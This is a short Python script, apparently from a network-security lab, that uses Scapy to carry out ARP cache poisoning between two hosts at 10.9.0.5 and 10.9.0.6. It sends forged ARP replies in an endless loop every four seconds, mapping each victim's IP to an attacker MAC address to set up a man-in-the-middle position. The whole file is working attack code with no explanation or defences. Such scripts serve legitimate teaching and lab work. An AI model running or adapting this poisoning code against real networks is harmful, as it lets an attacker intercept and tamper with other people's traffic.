#!/usr/bin/env python3
from scapy.all import *
import time
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

# This function will Map B's address to M in A's cache, and A's
# Address to M in B's cache.
def arp_poison():
    ether = Ether(dst = 'ff:ff:ff:ff:ff:ff')
    arp1 = ARP(op = 2, hwdst = 'ff:ff:ff:ff:ff:ff',hwsrc = '02:42:0a:09:00:69', psrc = IP_B, pdst = IP_A)
    arp2 = ARP(op = 2, hwdst = 'ff:ff:ff:ff:ff:ff',hwsrc = '02:42:0a:09:00:69', psrc = IP_A, pdst = IP_B)
    while True:
        sendp(ether/arp1)
        sendp(ether/arp2)
        time.sleep(4)
arp_poison()
